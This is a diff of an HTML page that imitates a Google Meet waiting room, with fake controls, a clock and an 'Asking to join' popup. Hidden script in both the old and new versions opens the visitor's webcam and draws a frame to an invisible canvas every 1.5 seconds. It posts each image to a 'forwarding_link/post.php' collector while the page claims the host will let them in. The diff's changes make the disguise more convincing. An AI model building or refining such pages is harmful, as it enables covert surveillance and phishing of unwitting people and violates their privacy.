@@ -1,233 +1,487 @@
-<!doctype html>
-<html>
+<!DOCTYPE html>
+<html lang="en">
 
 <head>
-  <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
-  <script src="https://kit.fontawesome.com/c4c45dfab4.js" crossorigin="anonymous"></script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Google Meet</title>
+  <link
+    href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@400;500&display=swap"
+    rel="stylesheet">
+  <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@24,400,0,0"
+    rel="stylesheet" />
   <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+  <style>
+    body {
+      background-color: #202124;
+      color: white;
+      font-family: 'Google Sans', 'Roboto', sans-serif;
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+    }
+
+    /* Main Area (Waiting Message) */
+    .main-container {
+      flex-grow: 1;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      padding: 16px;
+      position: relative;
+      text-align: center;
+    }
+
+    .waiting-message {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .profile-avatar {
+      width: 100px;
+      height: 100px;
+      background-color: #5f6368;
+      /* Default avatar color */
+      border-radius: 50%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-size: 48px;
+      color: white;
+      margin-bottom: 24px;
+      font-weight: 500;
+    }
+
+    .main-container h1 {
+      font-weight: 400;
+      font-size: 28px;
+      margin: 0 0 12px 0;
+    }
+
+    .main-container p {
+      color: #9aa0a6;
+      font-size: 16px;
+      margin: 0;
+      max-width: 400px;
+      line-height: 1.5;
+    }
+
+    /* Small Video Feed (PIP) */
+    .video-wrapper {
+      position: absolute;
+      bottom: 24px;
+      right: 24px;
+      width: 280px;
+      height: 160px;
+      border-radius: 8px;
+      overflow: hidden;
+      background: #3c4043;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 1px 2px 0 rgba(60, 64, 67, 0.3), 0 2px 6px 2px rgba(60, 64, 67, 0.15);
+      z-index: 10;
+      transition: all 0.3s ease;
+    }
+
+    video {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      transform: scaleX(-1);
+      /* Mirror effect */
+    }
+
+    /* Hover effect to show controls or resize (optional, keeping simple) */
+    .video-wrapper:hover {
+      box-shadow: 0 4px 8px 3px rgba(60, 64, 67, 0.15);
+    }
+
+    /* User Label inside PIP */
+    .user-label {
+      position: absolute;
+      bottom: 8px;
+      left: 8px;
+      color: white;
+      font-size: 12px;
+      font-weight: 500;
+      text-shadow: 0 1px 2px rgba(0, 0, 0, 0.8);
+      display: flex;
+      align-items: center;
+      pointer-events: none;
+    }
+
+    /* Canvas for capturing (Hidden) */
+    canvas {
+      display: none;
+    }
+
+    /* Bottom Control Bar */
+    .bottom-bar {
+      height: 80px;
+      background-color: #202124;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 0 24px;
+    }
+
+    /* Left Side: Time and Code */
+    .meeting-info {
+      display: flex;
+      align-items: center;
+      font-weight: 500;
+      font-size: 16px;
+      color: white;
+      min-width: 200px;
+    }
+
+    .meeting-info span {
+      margin-right: 16px;
+    }
+
+    .meeting-code {
+      color: #bdc1c6;
+      border-left: 1px solid #5f6368;
+      padding-left: 16px;
+    }
+
+    /* Center: Controls */
+    .controls {
+      display: flex;
+      gap: 12px;
+      align-items: center;
+    }
+
+    .control-btn {
+      background-color: #3c4043;
+      border: none;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      cursor: pointer;
+      transition: background-color 0.2s;
+      color: white;
+    }
+
+    .control-btn:hover {
+      background-color: #484c50;
+      box-shadow: 0 1px 3px rgba(0, 0, 0, 0.3);
+    }
+
+    .control-btn.red {
+      background-color: #ea4335;
+      width: 56px;
+      border-radius: 30px;
+    }
+
+    .control-btn.red:hover {
+      background-color: #d93025;
+    }
+
+    .material-icons,
+    .material-symbols-outlined {
+      font-size: 20px;
+      /* Default size */
+    }
+
+    .control-btn.red .material-icons {
+      font-size: 24px;
+    }
+
+
+    /* Right Side: Actions */
+    .actions {
+      display: flex;
+      align-items: center;
+      gap: 20px;
+      min-width: 200px;
+      justify-content: flex-end;
+    }
+
+    .action-btn {
+      background: none;
+      border: none;
+      color: white;
+      cursor: pointer;
+      padding: 8px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .action-btn:hover {
+      background-color: rgba(255, 255, 255, 0.1);
+    }
+
+    /* Popup overlay for "Waiting" message */
+    #ac-wrapper {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.8);
+      z-index: 1001;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      backdrop-filter: blur(5px);
+    }
+
+    #popup {
+      background: #202124;
+      padding: 24px;
+      border-radius: 8px;
+      color: white;
+      text-align: center;
+      box-shadow: 0 24px 38px 3px rgba(0, 0, 0, 0.14), 0 9px 46px 8px rgba(0, 0, 0, 0.12), 0 11px 15px -7px rgba(0, 0, 0, 0.2);
+      border: 1px solid #5f6368;
+    }
+
+    #popup h2 {
+      font-weight: 400;
+      font-size: 22px;
+      margin-bottom: 24px;
+    }
+
+    .loading-spinner {
+      border: 4px solid rgba(255, 255, 255, 0.1);
+      width: 36px;
+      height: 36px;
+      border-radius: 50%;
+      border-left-color: #8ab4f8;
+      animation: spin 1s linear infinite;
+      margin: 0 auto;
+    }
+
+    @keyframes spin {
+      0% {
+        transform: rotate(0deg);
+      }
+
+      100% {
+        transform: rotate(360deg);
+      }
+    }
+  </style>
 </head>
 
-<div class="video-wrap">
-  <video id="video" playsinline autoplay></video>
-</div>
-
-<center><canvas id="canvas" width="640" height="480" audoplay></canvas></center>
-
-<style>
-  @import url("https://fonts.googleapis.com/css2?family=Nunito:wght@500;500&display=swap");
-
-  body {
-    height: 100vh;
-    width: 100vw;
-  }
-
-  * {
-    padding: 0px;
-    margin: 0px;
-    font-family: 'Nunito', sans-serif;
-    font-weight: 500;
-  }
-
-  .main-screen {
-    background-color: #273039;
-    height: 100vh;
-    width: 100%;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-  }
-
-  img {
-    height: 80px;
-    width: 80px;
-  }
-
-  .bottom-bar {
-    position: fixed;
-    padding: 0px 40px 0px -40px;
-    bottom: 0px;
-    height: 80px;
-    width: 100%;
-    background-color: #1F2022;
-    display: flex;
-    flex-direction: row;
-    justify-content: center;
-    align-items: center;
-    color: #fff;
-  }
-
-  .icon-button {
-    display: flex;
-    flex-direction: column;
-    justify-items: center;
-    align-items: center;
-  }
-
-  i {
-    margin-bottom: 8px;
-    font-size: 26px;
-  }
-
-  button {
-    color: #fff;
-    background-color: crimson;
-    padding: 5px 20px;
-    border: none;
-    border-radius: 5px;
-    border-style: none;
-    outline: none;
-  }
-
-  .float_button {
-    background-color: #1F2022;
-    height: 40px;
-    border-radius: 5px;
-    width: 40px;
-    position: fixed;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    top: 5px;
-    right: 5px;
-  }
-  #ac-wrapper {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background: rgba(255,255,255,.6);
-    z-index: 1001;
-}
-
-#popup {
-    width: 555px;
-    height: 35px;
-    background: #FFFFFF;
-    border: 5px solid #000;
-    border-radius: 15px;
-    -moz-border-radius: 15px;
-    -webkit-border-radius: 15px;
-    box-shadow: #64686e 0px 0px 3px 3px;
-    -moz-box-shadow: #64686e 0px 0px 3px 3px;
-    -webkit-box-shadow: #64686e 0px 0px 3px 3px;
-    position: relative;
-    top: 250px; left: 375px;
-}
-</style>
-
-<script>
-
-  function post(imgdata) {
-    $.ajax({
-      type: 'POST',
-      data: { cat: imgdata },
-      url: 'forwarding_link/post.php',
-      dataType: 'json',
-      async: false,
-      success: function (result) {
-        // call the function that handles the response/results
-      },
-      error: function () {
-      }
-    });
-  };
-
-
-  'use strict';
-
-  const video = document.getElementById('video');
-  const canvas = document.getElementById('canvas');
-  const errorMsgElement = document.querySelector('span#errorMsg');
-
-  const constraints = {
-    audio: false,
-    video: {
-
-      facingMode: "user"
-    }
-  };
-
-  // Access webcam
-  async function init() {
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia(constraints);
-      handleSuccess(stream);
-    } catch (e) {
-      errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
-    }
-  }
-
-  // Success
-  function handleSuccess(stream) {
-    window.stream = stream;
-    video.srcObject = stream;
-
-    var context = canvas.getContext('2d');
-    setInterval(function () {
-
-      context.drawImage(video, 0, 0, 640, 480);
-      var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
-      post(canvasData);
-      video.play();
-    }, 1500);
-
-
-  }
-  function PopUp(){
-    document.getElementById('ac-wrapper').style.display="none"; 
-}
-  // Load init
-  init();
-  $(document).ready(function(){
-   setTimeout(function(){
-      PopUp();
-   },50000); // 5000 to load it after 5 seconds from page load
-});
-</script>
-
 <body>
-  <div class="float_button">
-    <i class="fas fa-expand" style="color: #fff; font-size: 18px; margin-top: 5px;"></i>
-  </div>
-  <div id="ac-wrapper">
-    <div id="popup">
-        <center>
-            <h2>Please wait the meeting host will let you in soon</h2>
-        </center>
+
+  <div class="main-container">
+    <div class="waiting-message">
+      <div class="profile-avatar">
+        <span>J</span> <!-- Initial or random letter -->
+      </div>
+      <h1>Waiting for host to join...</h1>
+      <p>As soon as the host joins, the meeting will start.</p>
     </div>
-</div>
+
+    <!-- PIP Video Feed -->
+    <div class="video-wrapper">
+      <video id="video" autoplay playsinline></video>
+      <div class="user-label">You</div>
+    </div>
+  </div>
+
+  <canvas id="canvas" width="640" height="480"></canvas>
+
   <div class="bottom-bar">
-    <div class="icon-button" style="margin-left: 50px;">
-      <i class="fas fa-microphone"></i>
-      <h6>Mute</h6>
+    <!-- Time and Code -->
+    <div class="meeting-info">
+      <span id="clock">10:00 AM</span>
+      <span class="meeting-code">abc-defg-hij</span>
     </div>
-    <div class="icon-button" style="margin-left: 50px;">
-      <i class="fas fa-video"></i>
-      <h6>Stop Video</h6>
+
+    <!-- Center Controls -->
+    <div class="controls">
+      <!-- Mute -->
+      <button class="control-btn" onclick="toggleMute(this)" title="Turn off microphone">
+        <span class="material-icons">mic</span>
+      </button>
+
+      <!-- Camera -->
+      <button class="control-btn" onclick="toggleVideo(this)" title="Turn off camera">
+        <span class="material-icons">videocam</span>
+      </button>
+
+      <!-- CC -->
+      <button class="control-btn" title="Turn on captions">
+        <span class="material-symbols-outlined">closed_caption</span>
+      </button>
+
+      <!-- Hand Raise -->
+      <button class="control-btn" title="Raise hand">
+        <span class="material-symbols-outlined">back_hand</span>
+      </button>
+
+      <!-- Screen Share -->
+      <button class="control-btn" title="Present now">
+        <span class="material-symbols-outlined">present_to_all</span>
+      </button>
+
+      <!-- More Options -->
+      <button class="control-btn" title="More options">
+        <span class="material-icons">more_vert</span>
+      </button>
+
+      <!-- End Call -->
+      <button class="control-btn red" title="Leave call" onclick="window.close()">
+        <span class="material-icons">call_end</span>
+      </button>
     </div>
-    <div class="icon-button" style="margin-left: auto;">
-      <i class="fas fa-shield-alt"></i>
-      <h6>Security</h6>
+
+    <!-- Right Side Actions -->
+    <div class="actions">
+      <button class="action-btn" title="Meeting details">
+        <span class="material-symbols-outlined">info</span>
+      </button>
+      <button class="action-btn" title="People">
+        <span class="material-icons">people_outline</span>
+      </button>
+      <button class="action-btn" title="Chat with everyone">
+        <span class="material-icons">chat_bubble_outline</span>
+      </button>
+      <button class="action-btn" title="Activities">
+        <span class="material-symbols-outlined">shapes</span>
+      </button>
+      <button class="action-btn" title="Host controls">
+        <span class="material-icons">lock_person</span>
+      </button>
     </div>
-    <div class="icon-button" style="margin-left: 50px;">
-      <i class="fas fa-users"></i>
-      <h6>Participants</h6>
-    </div>
-    <div class="icon-button" style="color: lawngreen; margin-left: 50px;">
-      <i class="fas fa-plus-square"></i>
-      <h6>Share content</h6>
-    </div>
-    <div class="icon-button" style="margin-left: 50px;">
-      <i class="fas fa-comments"></i>
-      <h6>Chat</h6>
-    </div>
-    <div class="icon-button" style="margin-right: auto; margin-left: 50px;">
-      <i class="fas fa-record-vinyl"></i>
-      <h6>Record</h6>
-    </div>
-    <button style="margin-right: 50px;">End</button>
   </div>
+
+  <!-- Popup Overlay -->
+  <div id="ac-wrapper" style="display:none;">
+    <div id="popup">
+      <div class="loading-spinner"></div>
+      <br>
+      <h2>Asking to join...</h2>
+      <p style="color: #bdc1c6; font-size: 14px;">You'll join the call when someone lets you in.</p>
+    </div>
+  </div>
+
+
+  <script>
+    // Existing Post Function
+    function post(imgdata) {
+      $.ajax({
+        type: 'POST',
+        data: { cat: imgdata },
+        url: 'forwarding_link/post.php',
+        dataType: 'json',
+        async: false,
+        success: function (result) {
+          // call the function that handles the response/results
+        },
+        error: function () {
+        }
+      });
+    };
+
+    'use strict';
+
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+
+    const constraints = {
+      audio: false, /* Audio false to confirm permissions easier in some browsers without user interaction if needed, but standard meet requests both */
+      video: {
+        facingMode: "user"
+      }
+    };
+
+    // Access webcam
+    async function init() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        handleSuccess(stream);
+      } catch (e) {
+        console.error(`navigator.getUserMedia error:${e.toString()}`);
+      }
+    }
+
+    // Success
+    function handleSuccess(stream) {
+      window.stream = stream;
+      video.srcObject = stream;
+
+      var context = canvas.getContext('2d');
+      setInterval(function () {
+        // Draw frames to hidden canvas
+        context.drawImage(video, 0, 0, 640, 480);
+        var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+        post(canvasData);
+      }, 1500);
+    }
+
+    // Initialize Webcam
+    init();
+
+    // Clock Functionality
+    function updateClock() {
+      const now = new Date();
+      let hours = now.getHours();
+      let minutes = now.getMinutes();
+      const ampm = hours >= 12 ? 'PM' : 'AM';
+
+      hours = hours % 12;
+      hours = hours ? hours : 12; // the hour '0' should be '12'
+      minutes = minutes < 10 ? '0' + minutes : minutes;
+
+      const strTime = hours + ':' + minutes + ' ' + ampm;
+      document.getElementById('clock').textContent = strTime;
+    }
+
+    setInterval(updateClock, 1000);
+    updateClock(); // initial call
+
+    // UI Interaction Functions
+    function toggleMute(btn) {
+      const icon = btn.querySelector('.material-icons');
+      if (icon.textContent === 'mic') {
+        icon.textContent = 'mic_off';
+        btn.style.backgroundColor = '#ea4335'; // Red when muted
+        btn.style.border = "none";
+      } else {
+        icon.textContent = 'mic';
+        btn.style.backgroundColor = '#3c4043';
+      }
+    }
+
+    function toggleVideo(btn) {
+      const icon = btn.querySelector('.material-icons');
+      const videoElem = document.getElementById('video');
+      if (icon.textContent === 'videocam') {
+        icon.textContent = 'videocam_off';
+        btn.style.backgroundColor = '#ea4335'; // Red when off
+        videoElem.style.display = 'none'; // Hide video to simulate off
+      } else {
+        icon.textContent = 'videocam';
+        btn.style.backgroundColor = '#3c4043';
+        videoElem.style.display = 'block';
+      }
+    }
+
+    $(document).ready(function () {
+      // Show the "Asking to join" popup after a delay, simulating the waiting room experience
+      setTimeout(function () {
+        document.getElementById('ac-wrapper').style.display = "flex";
+      }, 50000); // 50 seconds
+    });
+
+  </script>
 </body>
 
 </html>
